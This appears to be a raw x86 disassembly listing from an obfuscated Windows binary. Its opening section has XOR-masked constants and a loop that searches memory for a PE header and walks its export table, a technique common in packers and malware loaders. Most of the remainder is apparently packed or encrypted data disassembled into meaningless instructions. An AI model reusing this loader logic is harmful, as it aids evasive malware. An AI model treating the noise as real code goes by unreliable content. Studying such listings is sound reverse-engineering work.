  419275:	mov    ebx,esi
  419277:	sub    ebx,edi
  419279:	add    DWORD PTR [eax],ebx
  41927b:	mov    eax,DWORD PTR [ebp-0x4]
  41927e:	mov    edi,DWORD PTR [ebp-0x8]
  419281:	add    edi,DWORD PTR [eax]
  419283:	mov    DWORD PTR [ebp-0x8],edi
  419286:	mov    eax,DWORD PTR [ebp+0xc]
  419289:	mov    edi,DWORD PTR [ebp+0xc]
  41928c:	xor    edi,ecx
  41928e:	xor    eax,ecx
  419290:	lea    eax,[eax+edi*1+0x64e5b6]
  419297:	mov    edi,DWORD PTR [ebp+0xc]
  41929a:	xor    edi,ecx
  41929c:	add    edi,edx
  41929e:	imul   eax,edi
  4192a1:	mov    edi,DWORD PTR [ebp+0xc]
  4192a4:	xor    edi,ecx
  4192a6:	sub    edi,eax
  4192a8:	mov    eax,DWORD PTR [ebp-0x4]
  4192ab:	add    edi,edx
  4192ad:	cmp    DWORD PTR [eax],edi
  4192af:	mov    eax,DWORD PTR [ebp-0x4]
  4192b2:	mov    edi,DWORD PTR [ebp+0x10]
  4192b5:	jg     0x4192c8
  4192bb:	xor    edi,ecx
  4192bd:	mov    ebx,esi
  4192bf:	sub    ebx,edi
  4192c1:	add    DWORD PTR [eax],ebx
  4192c3:	jmp    0x4192ce
  4192c8:	xor    edi,ecx
  4192ca:	add    edi,edx
  4192cc:	add    DWORD PTR [eax],edi
  4192ce:	mov    eax,DWORD PTR [ebp-0x8]
  4192d1:	mov    edi,DWORD PTR [ebp-0x10]
  4192d4:	mov    eax,DWORD PTR [eax]
  4192d6:	xor    edi,ecx
  4192d8:	add    edi,0x3272da
  4192de:	not    edi
  4192e0:	and    eax,edi
  4192e2:	movsx  di,BYTE PTR [eax+0x1]
  4192e7:	mov    ebx,0x3b4b
  4192ec:	sub    di,bx
  4192ef:	mov    ebx,0x8a85
  4192f4:	xor    di,bx
  4192f7:	mov    ebx,0x4f8a
  4192fc:	cmp    di,bx
  4192ff:	jne    0x419327
  419305:	movsx  di,BYTE PTR [eax]
  419309:	mov    ebx,0x3b4b
  41930e:	sub    di,bx
  419311:	mov    ebx,0x8a85
  419316:	xor    di,bx
  419319:	mov    ebx,0x4f87
  41931e:	cmp    di,bx
  419321:	je     0x419337
  419327:	mov    edi,DWORD PTR [ebp-0x10]
  41932a:	xor    edi,ecx
  41932c:	mov    ebx,esi
  41932e:	sub    ebx,edi
  419330:	add    eax,ebx
  419332:	jmp    0x4192e2
  419337:	mov    esi,DWORD PTR [ebp-0x14]
  41933a:	mov    esi,DWORD PTR [esi]
  41933c:	mov    edi,DWORD PTR [eax+0x3c]
  41933f:	lea    esi,[edi+esi*8+0x78]
  419343:	mov    esi,DWORD PTR [esi+eax*1]
  419346:	mov    DWORD PTR [ebp-0x8],esi
  419349:	mov    esi,DWORD PTR [ebp+0x8]
  41934c:	xor    esi,ecx
  41934e:	add    esi,edx
  419350:	mov    DWORD PTR [ebp-0x14],esi
  419353:	mov    esi,DWORD PTR [ebp+0x8]
  419356:	mov    edi,DWORD PTR [ebp-0x8]
  419359:	xor    esi,ecx
  41935b:	add    esi,edx
  41935d:	pop    ebx
  41935e:	cmp    edi,esi
  419360:	jne    0x41937e
  419366:	mov    eax,DWORD PTR [ebp+0xc]
  419369:	xor    eax,ecx
  41936b:	mov    ecx,DWORD PTR [ebp-0x8]
  41936e:	add    eax,edx
  419370:	imul   eax,ecx
  419373:	mov    DWORD PTR [ebp-0x8],eax
  419376:	push   DWORD PTR [ebp+0x18]
  419379:	jmp    0x41b78a
  41937e:	mov    ecx,DWORD PTR [ebp-0x8]
  419381:	add    ecx,eax
  419383:	jmp    0x41b73b
  419388:	dec    ebx
  419389:	cmp    al,0x60
  41938b:	or     DWORD PTR [edi],0x426c6b9d
  419391:	push   cs
  419392:	mov    ch,BYTE PTR [ebx+edx*4-0x5c]
  419396:	mov    dh,0x9d
  419398:	fild   WORD PTR [ecx]
  41939a:	popa   
  41939b:	(bad)  
  41939c:	(bad)  
  41939d:	pop    edi
  41939e:	bound  esp,QWORD PTR [edx-0x16]
  4193a1:	mov    dl,0x98
  4193a3:	xchg   ebx,eax
  4193a4:	out    0x76,eax
  4193a6:	add    al,0x84
  4193a8:	sahf   
  4193a9:	xchg   ecx,eax
  4193aa:	push   0xffffffea
  4193ac:	lock sub bh,ch
  4193af:	mov    esi,0x11e15605
  4193b4:	mov    ecx,0x9858f11c
  4193b9:	cmc    
  4193ba:	jge    0x41937a
  4193bc:	adc    ah,BYTE PTR [edx-0x5e]
  4193bf:	pop    esp
  4193c0:	out    0xd2,eax
  4193c2:	jge    0x4193b0
  4193c4:	mov    al,ds:0xbcab8fe4
  4193c9:	and    al,0x97
  4193cb:	rcr    al,cl
  4193cd:	push   esi
  4193ce:	fidiv  WORD PTR [edx]
  4193d0:	clc    
  4193d1:	sub    ecx,esi
  4193d3:	jae    0x4193b4
  4193d5:	sbb    BYTE PTR [edi],0x44
  4193d8:	les    edi,FWORD PTR [ecx+0x1b68ee8]
  4193de:	les    esi,FWORD PTR [ebp+0x17eb714e]
  4193e4:	mov    WORD PTR [edx+esi*1-0x2c],fs
  4193e8:	xchg   esp,eax
  4193e9:	imul   ebp,esi,0xea645ba3
  4193ef:	sbb    dh,BYTE PTR [ecx]
  4193f1:	mov    ah,0x42
  4193f3:	retf   
  4193f4:	sub    BYTE PTR [eax],cl
  4193f6:	jo     0x4193a8
  4193f8:	sub    al,0xef
  4193fa:	enter  0x2c92,0x25
  4193fe:	fs daa 
  419400:	push   0x4d
  419402:	push   0x5a
  419404:	dec    edx
  419405:	mov    ebx,0xffb33654
  41940a:	jg     0x419435
  41940c:	cmc    
  41940d:	(bad)  [esi+0x69f1f3a]
  419413:	adc    al,0x45
  419415:	jo     0x419400
  419417:	mov    ebx,0x1c127db
  41941c:	mov    DWORD PTR [edi+0x6a],0x79783a7
  419423:	shr    BYTE PTR [eax+0xa],1
  419426:	sbb    ah,ch
  419428:	add    esp,DWORD PTR [edi+esi*4]
  41942b:	jl     0x419470
  41942d:	and    eax,0x79e51b5f
  419432:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419433:	adc    edx,DWORD PTR [esi]
  419435:	adc    eax,0x5198aa82
  41943a:	mov    edi,0x41ccb2c8
  41943f:	jno    0x419458
  419441:	dec    eax
  419442:	mov    ?,WORD PTR [ebp-0x636ce57f]
  419448:	jp     0x419475
  41944a:	and    cl,BYTE PTR [ebx+0x6a1a06f0]
  419450:	pop    edx
  419451:	leave  
  419452:	cmp    ecx,DWORD PTR [ecx-0x2ee55643]
  419458:	and    eax,0x1c7910c5
  41945d:	jns    0x4194ba
  41945f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419460:	xchg   ebx,eax
  419461:	stc    
  419462:	ror    BYTE PTR [ebx],0x7a
  419465:	repz shl BYTE PTR [ebp+0x1a],0x5f
  41946a:	and    BYTE PTR [edi],0x73
  41946d:	jl     0x41949a
  41946f:	ficomp WORD PTR [edi+0x27]
  419472:	loop   0x419452
  419474:	push   ss
  419475:	add    cl,BYTE PTR [esp+edi*4-0x506cf14d]
  41947c:	xchg   edx,eax
  41947d:	dec    eax
  41947e:	or     eax,0xd92338df
  419483:	fnstcw WORD PTR [ecx+0x7f]
  419486:	mov    ds:0x55ffc79b,al
  41948b:	(bad)  
  41948d:	cmc    
  41948e:	push   cs
  41948f:	cli    
  419490:	adc    eax,0x9b809354
  419495:	jns    0x41942f
  419497:	data16 cmp BYTE PTR [ebx+esi*8-0x55],0xb
  41949d:	lods   al,BYTE PTR ds:[esi]
  41949e:	rol    ecx,cl
  4194a0:	push   eax
  4194a1:	mov    cl,0x9a
  4194a3:	jne    0x419435
  4194a5:	or     dl,BYTE PTR [ecx+0x6]
  4194a8:	add    eax,0x2d60f3ff
  4194ad:	inc    esp
  4194ae:	xor    DWORD PTR [edx+0x60],eax
  4194b1:	imul   eax,eax,0xfec5fbd2
  4194b7:	rol    BYTE PTR [ebx-0x17],1
  4194ba:	fdivr  DWORD PTR [edi-0x51c7eda4]
  4194c0:	dec    esp
  4194c1:	aam    0xd5
  4194c3:	mov    ebx,0x2adc480c
  4194c8:	jo     0x419485
  4194ca:	pop    ebx
  4194cb:	jmp    0x7a1caa68
  4194d0:	ror    BYTE PTR [esi],cl
  4194d2:	fisubr WORD PTR [ebx-0x4178bfb0]
  4194d8:	mov    eax,0x597de1dd
  4194dd:	push   esi
  4194de:	or     edx,0x1ef706c1
  4194e4:	mov    dl,0x1
  4194e6:	shl    DWORD PTR [ecx-0x26],1
  4194e9:	sbb    dl,BYTE PTR [ebx]
  4194eb:	add    eax,0x242ac081
  4194f0:	clc    
  4194f1:	sti    
  4194f2:	gs sub eax,0xfd7f03cb
  4194f8:	fdiv   QWORD PTR [eax-0x5d]
  4194fb:	retf   
  4194fc:	mov    ds:0x499448bd,al
  419501:	call   0x8608:0x8727d2dd
  419508:	xor    eax,0xf7ac44ce
  41950d:	je     0x41951f
  41950f:	xlat   BYTE PTR ds:[ebx]
  419510:	jbe    0x419530
  419512:	mov    DWORD PTR [ecx],ebp
  419514:	adc    edi,DWORD PTR [edi+0x38a88f27]
  41951a:	aam    0x19
  41951c:	(bad)  
  41951d:	jle    0x4194f2
  41951f:	add    eax,0x6c3c70df
  419524:	jp     0x419528
  419526:	jne    0x4194df
  419528:	daa    
  419529:	or     eax,0xabf2d3e9
  41952e:	push   0xffbfcc90
  419533:	dec    edi
  419534:	sub    cl,BYTE PTR [esi]
  419536:	push   esp
  419537:	shl    DWORD PTR [edi+0x7a4ff72f],1
  41953d:	cmp    al,0xaf
  41953f:	lods   al,BYTE PTR ds:[esi]
  419540:	mov    ebx,0xd19561d6
  419545:	addr16 aad 0x88
  419548:	cmp    eax,0x8038a750
  41954d:	add    BYTE PTR [ecx],al
  41954f:	pop    eax
  419550:	les    edx,FWORD PTR [edi+esi*8]
  419553:	mov    ah,0xd0
  419555:	dec    ecx
  419556:	pop    esp
  419557:	jb     0x4195d7
  419559:	inc    ebx
  41955a:	(bad)  
  41955b:	arpl   ax,bx
  41955d:	xchg   DWORD PTR [ebp-0x444957cb],esi
  419563:	and    esp,DWORD PTR [ebx]
  419565:	(bad)  
  419566:	dec    ecx
  419567:	fmul   DWORD PTR [esi+0x79]
  41956a:	xchg   esp,eax
  41956b:	cwde   
  41956c:	imul   edx,DWORD PTR [ebx+edi*4-0x5],0x155ca669
  419574:	mov    esi,0x740b7fd0
  419579:	(bad)  
  41957a:	lock aad 0xd5
  41957d:	neg    esp
  41957f:	sti    
  419580:	cmc    
  419581:	or     eax,0x2c705345
  419586:	fmul   st,st(3)
  419588:	or     eax,0xa9c713a1
  41958d:	aad    0xca
  41958f:	out    0x46,eax
  419591:	push   ebp
  419592:	cld    
  419593:	sbb    al,0x73
  419595:	fimul  DWORD PTR [eax+edx*4+0x19]
  419599:	std    
  41959a:	frstor [esi-0x5b51a6f9]
  4195a0:	mov    ebx,0xfebede00
  4195a5:	push   ss
  4195a6:	js     0x419566
  4195a8:	push   ds
  4195a9:	div    DWORD PTR fs:[eax+edx*4-0x11857adc]
  4195b1:	mov    cl,0xba
  4195b3:	dec    edx
  4195b4:	repnz imul esp,DWORD PTR [edi],0xffffffda
  4195b8:	pop    ds
  4195b9:	ds loopne 0x4195f9
  4195bc:	mov    BYTE PTR [edi-0xceea4da],al
  4195c2:	repnz mov ?,WORD PTR gs:[edx+0x32347880]
  4195ca:	xor    dl,dh
  4195cc:	xchg   BYTE PTR [ebx+ecx*2-0x2b],bl
  4195d0:	retf   0x4228
  4195d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4195d4:	dec    edx
  4195d5:	mov    edx,0xc576ed83
  4195da:	stos   DWORD PTR es:[edi],eax
  4195db:	dec    eax
  4195dc:	jg     0x41964b
  4195de:	fs out dx,al
  4195e0:	fst    DWORD PTR [esi-0x3b9bfdce]
  4195e6:	and    eax,0xffeded2
  4195eb:	push   0xffffff85
  4195ed:	std    
  4195ee:	out    dx,eax
  4195ef:	in     al,dx
  4195f0:	dec    edi
  4195f1:	stos   DWORD PTR es:[edi],eax
  4195f2:	push   0x52bbbe60
  4195f7:	jp     0x41962d
  4195f9:	fistp  WORD PTR [edi+0x3b6d42bc]
  4195ff:	js     0x4195a7
  419601:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419602:	mov    dl,0xe1
  419604:	fwait
  419605:	jnp    0x419677
  419607:	and    al,0x5a
  419609:	nop
  41960a:	rol    BYTE PTR [edx],1
  41960c:	cmp    dl,BYTE PTR [ecx+0x2d]
  41960f:	pushf  
  419610:	inc    edx
  419611:	out    0xc2,eax
  419613:	fild   QWORD PTR [ebx+0x44]
  419616:	dec    esp
  419617:	int3   
  419618:	shr    BYTE PTR [eax],0x6f
  41961b:	xchg   ebx,eax
  41961c:	sub    DWORD PTR [edx+esi*4],0x72349f83
  419623:	fld    TBYTE PTR [edx-0x8]
  419626:	call   0xa011d48f
  41962b:	inc    ebp
  41962c:	push   0xffffff83
  41962e:	leave  
  41962f:	retf   
  419630:	lock es js 0x41963f
  419634:	push   ecx
  419635:	or     BYTE PTR [eax],bl
  419637:	dec    edi
  419638:	gs scas eax,DWORD PTR es:[edi]
  41963a:	adc    al,0xc0
  41963c:	out    dx,al
  41963d:	push   ss
  41963e:	and    al,0x25
  419640:	mov    es,WORD PTR [edx]
  419642:	sbb    ebp,esi
  419644:	repz fs xchg ebp,eax
  419647:	xchg   esi,eax
  419648:	repz sbb al,0x1e
  41964b:	xchg   ebx,eax
  41964c:	gs adc esi,edi
  41964f:	and    al,0x6a
  419651:	push   es
  419652:	push   ds
  419653:	add    cl,dl
  419655:	loop   0x41967b
  419657:	sti    
  419658:	jge    0x419643
  41965a:	arpl   WORD PTR [edi-0x1988e60d],cx
  419660:	nop
  419661:	mov    edx,0x67b74644
  419666:	fwait
  419667:	outs   dx,DWORD PTR ds:[esi]
  419668:	dec    edx
  419669:	jae    0x41963f
  41966b:	xchg   esp,eax
  41966c:	shl    BYTE PTR [ecx+0x27],0xc1
  419670:	repnz inc ebp
  419672:	clc    
  419673:	ficomp DWORD PTR [bx]
  419676:	xchg   esp,eax
  419677:	fmulp  st(6),st
  419679:	inc    edx
  41967a:	jae    0x419669
  41967c:	push   ebx
  41967d:	dec    edi
  41967e:	add    eax,ecx
  419680:	repz rol DWORD PTR [ebp-0x5],1
  419684:	xchg   ebp,eax
  419685:	adc    esp,DWORD PTR [edi-0x4f247fb2]
  41968b:	fisub  DWORD PTR [ecx+0x72]
  41968e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41968f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419690:	ret    0x3b0f
  419693:	adc    BYTE PTR [edx+0x18],dl
  419696:	sub    al,0x4
  419698:	test   al,0xd5
  41969a:	nop
  41969b:	iret   
  41969c:	xchg   DWORD PTR ds:0xf9ffbb33,edi
  4196a2:	adc    ch,BYTE PTR [edi+0xa]
  4196a5:	(bad)  [esi+0xb98fc08]
  4196ab:	xchg   ebp,eax
  4196ac:	push   ebx
  4196ad:	ss inc edi
  4196af:	push   es
  4196b0:	mov    al,ds:0x6409266d
  4196b5:	call   0xedca48b8
  4196ba:	fsubr  QWORD PTR [eax]
  4196bc:	xchg   DWORD PTR [ecx+ebp*1+0x39],ebx
  4196c0:	sahf   
  4196c1:	mov    cl,0x8f
  4196c3:	lods   al,BYTE PTR ds:[esi]
  4196c4:	inc    esp
  4196c5:	mov    edi,DWORD PTR [ebx]
  4196c7:	lds    eax,FWORD PTR [eax]
  4196c9:	fild   QWORD PTR [ecx]
  4196cb:	adc    edx,DWORD PTR [eax-0x5a59d647]
  4196d1:	inc    ecx
  4196d2:	inc    ebx
  4196d3:	inc    DWORD PTR [eax*8+0x15096dbc]
  4196da:	xor    eax,0x7045ada9
  4196df:	out    dx,eax
  4196e0:	in     al,0x4e
  4196e2:	lea    ebp,[edx]
  4196e4:	pop    ds
  4196e5:	sbb    al,dh
  4196e7:	add    al,BYTE PTR [ebp+0x33]
  4196ea:	xlat   BYTE PTR ds:[ebx]
  4196eb:	shl    ch,cl
  4196ed:	in     eax,0xc4
  4196ef:	xlat   BYTE PTR ds:[ebx]
  4196f0:	pop    ebx
  4196f1:	cmp    ah,BYTE PTR [ecx+edx*1-0x22]
  4196f5:	scas   eax,DWORD PTR es:[edi]
  4196f6:	pop    ds
  4196f7:	retf   0xac33
  4196fa:	fnstenv [esi+0x19]
  4196fd:	lds    esi,FWORD PTR [edi]
  4196ff:	outs   dx,BYTE PTR ds:[esi]
  419700:	dec    ecx
  419701:	mov    ds:0x197c5f2f,al
  419706:	add    ebp,DWORD PTR [esi-0x4c18e999]
  41970c:	add    al,0x61
  41970e:	ins    BYTE PTR es:[edi],dx
  41970f:	sub    eax,0xe86e88cb
  419714:	adc    ah,dl
  419716:	sar    DWORD PTR [ebx+0x38fc00c3],cl
  41971c:	pop    edi
  41971d:	mov    edi,0x5e78465
  419722:	jno    0x419775
  419724:	add    DWORD PTR [ebp+0x78],edi
  419727:	mov    dh,0x6c
  419729:	and    al,0x47
  41972b:	cwde   
  41972c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41972d:	repz cmp edi,esp
  419730:	cvtps2pi mm1,xmm6
  419733:	push   eax
  419734:	cwde   
  419735:	mov    bh,0xbd
  419737:	pop    ds
  419738:	iret   
  419739:	or     cl,bl
  41973b:	mov    ebx,0x83c3529d
  419740:	push   ds
  419741:	xchg   esi,eax
  419742:	push   eax
  419743:	clc    
  419744:	inc    ebx
  419745:	cmp    BYTE PTR cs:[edi+0x4d],bh
  419749:	lea    esi,[ebp+0x59]
  41974c:	push   ebx
  41974d:	ja     0x4197a7
  41974f:	mov    ebp,0x9acf0498
  419754:	jmp    0x53b21033
  419759:	scas   eax,DWORD PTR es:[edi]
  41975a:	mov    ds:0x25b0ca56,eax
  41975f:	ret    0x2c81
  419762:	iret   
  419763:	fsub   QWORD PTR [ecx]
  419765:	add    BYTE PTR [edi],ch
  419767:	in     al,dx
  419768:	cmp    edx,edi
  41976a:	pop    edi
  41976b:	xor    al,0x8d
  41976d:	ficomp WORD PTR [eax]
  41976f:	pop    ebp
  419770:	or     BYTE PTR [ebx],ch
  419772:	daa    
  419773:	sub    ebp,esi
  419775:	sar    BYTE PTR [eax+0x1dd0396],cl
  41977b:	xchg   ecx,eax
  41977c:	scas   al,BYTE PTR es:[edi]
  41977d:	adc    DWORD PTR [ecx+ecx*8],edx
  419780:	(bad)  
  419781:	mov    cl,0x92
  419783:	nop
  419784:	lds    ebp,FWORD PTR [edx]
  419786:	cmp    edx,DWORD PTR [esi-0x1e735a14]
  41978c:	xor    eax,0xa2027675
  419791:	cli    
  419792:	mov    bl,BYTE PTR [ecx+0x7f6e9384]
  419798:	dec    ecx
  419799:	add    al,0x58
  41979b:	adc    cl,BYTE PTR [eax+ebx*8-0x18]
  41979f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4197a0:	inc    esi
  4197a1:	and    ah,dl
  4197a3:	mov    eax,0x5bda6c80
  4197a8:	leave  
  4197a9:	popf   
  4197aa:	push   eax
  4197ab:	adc    ah,BYTE PTR [eax-0x75]
  4197ae:	aad    0xf3
  4197b0:	aam    0x26
  4197b2:	cmp    ch,BYTE PTR [ecx]
  4197b4:	mov    eax,0x84d8de6d
  4197b9:	shr    BYTE PTR [ecx-0xf40d8a6],cl
  4197bf:	mov    dl,0x48
  4197c1:	xor    eax,0x591463c4
  4197c6:	sbb    eax,0xf316e9fc
  4197cb:	push   es
  4197cc:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  4197ce:	cwde   
  4197cf:	repnz sub eax,0x46a5cbbb
  4197d5:	test   BYTE PTR [ebx],cl
  4197d7:	sub    DWORD PTR [eax+0x2ce1c709],esp
  4197dd:	push   edi
  4197de:	sub    DWORD PTR [edi],ebx
  4197e0:	retf   0xe813
  4197e3:	mov    WORD PTR [ebp-0x479ad86d],ss
  4197e9:	ret    
  4197ea:	push   cs
  4197eb:	add    ebx,DWORD PTR [eax+0x32c14b9a]
  4197f1:	pop    ebp
  4197f2:	mov    WORD PTR [edi+0x4c9ba4d],ss
  4197f8:	mov    ah,0xa2
  4197fa:	loop   0x41979a
  4197fc:	or     eax,0xc4e60db8
  419801:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419802:	ja     0x41985a
  419804:	jl     0x419877
  419806:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419807:	xchg   edi,eax
  419808:	mov    ds:0x2ec4c08f,eax
  41980d:	lds    edx,FWORD PTR [edx-0x52]
  419810:	cwde   
  419811:	imul   ebx,DWORD PTR [eax-0x2801df61],0xedfbf5a3
  41981b:	sbb    al,0xc5
  41981d:	loope  0x4197b3
  41981f:	fld    QWORD PTR [ebp-0x48ea7035]
  419825:	je     0x419881
  419827:	inc    ebp
  419828:	sahf   
  419829:	mov    esi,0x2a9920e
  41982e:	and    ebx,DWORD PTR [esi]
  419830:	sahf   
  419831:	mov    WORD PTR [ebx],?
  419833:	jb     0x4197fa
  419835:	stos   DWORD PTR es:[edi],eax
  419836:	jb     0x4197c3
  419838:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419839:	cdq    
  41983a:	adc    DWORD PTR [eax+0x56013959],ecx
  419840:	cld    
  419841:	test   al,0x35
  419843:	les    ebx,FWORD PTR [ebx-0x497853a4]
  419849:	pop    ecx
  41984a:	ret    0x250d
  41984d:	pop    edx
  41984e:	in     al,0xa1
  419850:	xchg   DWORD PTR [edx+esi*2],ebx
  419853:	(bad)  
  419854:	rol    DWORD PTR [esi],1
  419856:	xor    al,0x9e
  419858:	pop    esi
  419859:	test   ch,dl
  41985b:	in     al,dx
  41985c:	push   ss
  41985d:	sbb    ebp,edx
  41985f:	and    eax,0xcbbbcd6e
  419864:	leave  
  419865:	inc    edi
  419866:	xor    esp,DWORD PTR [eax+0x370c7513]
  41986c:	mov    ds:0xe655a1fd,al
  419871:	cwde   
  419872:	and    DWORD PTR ss:[ecx-0x4bcdff0],ecx
  419879:	and    eax,0xc647652e
  41987e:	aam    0x31
  419880:	dec    eax
  419881:	dec    edx
  419882:	test   eax,0xe31e5cd5
  419887:	dec    ebp
  419888:	cmp    DWORD PTR ds:0x4816eedf,eax
  41988e:	das    
  41988f:	push   0x10
  419891:	pop    ebp
  419892:	nop
  419893:	out    0xa1,al
  419895:	dec    edi
  419896:	or     DWORD PTR [ebx+0xc],0xffffffd3
  41989a:	or     BYTE PTR [esi+0x7e3245a8],0xed
  4198a1:	jmp    0x419896
  4198a3:	imul   eax,DWORD PTR [eax-0x74],0x8db2dd37
  4198aa:	scas   al,BYTE PTR es:[edi]
  4198ab:	fistp  WORD PTR [ecx-0x1c5aa473]
  4198b1:	cmp    dl,ah
  4198b3:	push   0x382b8663
  4198b8:	call   0xc61c7041
  4198bd:	(bad)  
  4198be:	shl    DWORD PTR [ebx+0x16c3fe83],cl
  4198c4:	fs push es
  4198c6:	jns    0x419881
  4198c8:	sub    DWORD PTR [esi-0x67],edi
  4198cb:	out    0x8b,eax
  4198cd:	sbb    eax,0x2af83401
  4198d2:	mov    al,0xb4
  4198d4:	cdq    
  4198d5:	pop    ecx
  4198d6:	pop    es
  4198d7:	inc    edi
  4198d8:	push   es
  4198d9:	ins    DWORD PTR es:[edi],dx
  4198da:	(bad)  
  4198db:	jp     0x41985d
  4198dd:	shl    DWORD PTR [ecx+eax*8],1
  4198e0:	and    dl,ch
  4198e2:	xchg   ebp,eax
  4198e3:	jns    0x419950
  4198e5:	in     eax,dx
  4198e6:	pop    eax
  4198e7:	inc    esp
  4198e8:	je     0x419930
  4198ea:	ror    BYTE PTR [edi],cl
  4198ec:	or     al,0x34
  4198ee:	retf   
  4198ef:	xchg   esp,eax
  4198f0:	lods   al,BYTE PTR ds:[esi]
  4198f1:	push   ebx
  4198f2:	aaa    
  4198f3:	scas   al,BYTE PTR es:[edi]
  4198f4:	fsubr  st(2),st
  4198f6:	test   BYTE PTR [esi+0x7c],0xf6
  4198fa:	sbb    ah,ch
  4198fc:	and    BYTE PTR [esi-0x4afe5ddd],0xa1
  419903:	in     eax,dx
  419904:	cli    
  419905:	in     al,dx
  419906:	aas    
  419907:	dec    eax
  419908:	mov    bh,0xa5
  41990a:	scas   al,BYTE PTR es:[edi]
  41990b:	mov    ebx,0x37fcfe8c
  419910:	imul   esi,DWORD PTR [ebp+0x7c],0x2d
  419914:	xchg   edx,eax
  419915:	outs   dx,DWORD PTR ds:[esi]
  419916:	dec    esi
  419917:	aas    
  419918:	mov    eax,ds:0x40f9cd78
  41991e:	clc    
  41991f:	push   edx
  419920:	jp     0x419936
  419922:	sbb    eax,0x4aa6f6e2
  419927:	dec    edi
  419928:	int    0xee
  41992a:	lock jns 0x419940
  41992d:	xchg   DWORD PTR [esi+0x576a73bd],ebp
  419933:	xchg   DWORD PTR [ecx],ecx
  419935:	ins    BYTE PTR es:[edi],dx
  419936:	cmc    
  419937:	mov    ecx,0xf6711a27
  41993c:	inc    esi
  41993d:	cmp    BYTE PTR [edi],0xd2
  419940:	sub    al,0x6
  419942:	call   0xd0c4:0xe9d99ede
  419949:	cmp    ebx,esp
  41994b:	xchg   esp,ebx
  41994d:	sahf   
  41994e:	sbb    esp,DWORD PTR [eax+0x79]
  419951:	ins    BYTE PTR es:[edi],dx
  419952:	pop    edi
  419953:	ds aas 
  419955:	xadd   ah,dl
  419958:	push   ecx
  419959:	ds retf 0x8cdb
  41995d:	imul   edi,DWORD PTR [eax],0xffffffaa
  419960:	mov    WORD PTR [esp+ebp*4],ss
  419963:	div    DWORD PTR [ebx+0x11]
  419966:	or     al,0x2a
  419968:	test   eax,0xc7725389
  41996d:	gs push cs
  41996f:	fisubr DWORD PTR [eax]
  419971:	dec    ecx
  419972:	nop
  419973:	mov    esp,0x4d990f71
  419978:	clc    
  419979:	das    
  41997a:	gs inc si
  41997d:	sub    al,bh
  41997f:	shl    DWORD PTR ds:0x201083b8,1
  419985:	fs jecxz 0x4199ec
  419988:	fidiv  DWORD PTR [ebx+0x4f]
  41998b:	mov    eax,0xf4dc6f33
  419990:	scas   eax,DWORD PTR es:[edi]
  419991:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419992:	xchg   ebx,eax
  419993:	idiv   DWORD PTR [esp+edi*2-0x11]
  419997:	or     BYTE PTR [esp+edx*4-0x40],al
  41999b:	inc    esi
  41999c:	scas   eax,DWORD PTR es:[edi]
  41999d:	gs mov edi,0x1880b94d
  4199a3:	repnz sub esi,DWORD PTR [edx-0x59]
  4199a7:	cmp    al,BYTE PTR [esi+0x8]
  4199aa:	push   es
  4199ab:	jl     0x419960
  4199ad:	inc    edi
  4199ae:	adc    BYTE PTR [ecx],dh
  4199b0:	jo     0x419996
  4199b2:	push   0xe2107022
  4199b7:	cmp    DWORD PTR [eax-0x7d7e16bd],ebx
  4199bd:	cld    
  4199be:	jnp    0x419a37
  4199c0:	rcr    BYTE PTR [ebx-0x1],1
  4199c3:	lods   eax,DWORD PTR ds:[esi]
  4199c4:	fisttp WORD PTR [ebx]
  4199c6:	xor    esi,DWORD PTR [esi]
  4199c8:	xchg   esp,eax
  4199c9:	push   es
  4199ca:	inc    edi
  4199cb:	jb     0x419a2d
  4199cd:	in     al,dx
  4199ce:	mov    esp,0x7a71f1a5
  4199d3:	adc    cl,ah
  4199d5:	mov    edx,0x5bc8396e
  4199da:	int    0x16
  4199dc:	and    BYTE PTR [ecx],0xcb
  4199df:	push   0x3c
  4199e1:	dec    esp
  4199e2:	or     DWORD PTR [ebp-0xd],eax
  4199e5:	push   eax
  4199e6:	rcr    BYTE PTR [ecx+0x6d],cl
  4199e9:	dec    edx
  4199ea:	and    DWORD PTR [eax],ebp
  4199ec:	push   esp
  4199ed:	outs   dx,DWORD PTR ds:[esi]
  4199ee:	xor    DWORD PTR es:[edx+0xb421e69],esp
  4199f5:	sub    edi,ebp
  4199f7:	xor    BYTE PTR [ebx-0x5340f4c2],dl
  4199fd:	push   ecx
  4199fe:	or     esp,DWORD PTR [eax+0x2]
  419a01:	jnp    0x4199e4
  419a03:	loope  0x4199f9
  419a05:	pop    ecx
  419a06:	push   ecx
  419a07:	add    eax,DWORD PTR [ebp-0x64ae60f0]
  419a0d:	fwait
  419a0e:	(bad)
  419a11:	mov    WORD PTR [ecx+0x5bb630ec],fs
  419a17:	sub    edi,ecx
  419a19:	ins    BYTE PTR es:[edi],dx
  419a1a:	icebp  
  419a1b:	lods   eax,DWORD PTR ds:[esi]
  419a1c:	jecxz  0x4199b6
  419a1e:	adc    DWORD PTR [edx-0x2a],esi
  419a21:	sbb    eax,0x3d773cab
  419a26:	loopne 0x419aa5
  419a28:	push   eax
  419a29:	mov    al,ds:0x929da427
  419a2e:	add    DWORD PTR [edi+0x72],edx
  419a31:	rol    DWORD PTR [edx-0x75],cl
  419a34:	push   0x38
  419a36:	sub    DWORD PTR [edx+edx*1],eax
  419a39:	das    
  419a3a:	jmp    0x9909bb31
  419a3f:	ret    0xacc
  419a42:	mov    eax,ds:0xc6aef625
  419a47:	cmp    BYTE PTR [ebp+0x3d],ah
  419a4a:	sub    DWORD PTR [edi],eax
  419a4c:	sbb    bl,dh
  419a4e:	inc    esp
  419a4f:	je     0x419abd
  419a51:	push   0x14
  419a53:	inc    ecx
  419a54:	pop    ebp
  419a55:	xchg   esi,eax
  419a56:	call   0x5c99:0x7b5fcdc2
  419a5d:	jns    0x4199e1
  419a5f:	rol    BYTE PTR [esi],cl
  419a61:	movq   mm4,mm2
  419a64:	cmp    DWORD PTR [edx-0x22],ebx
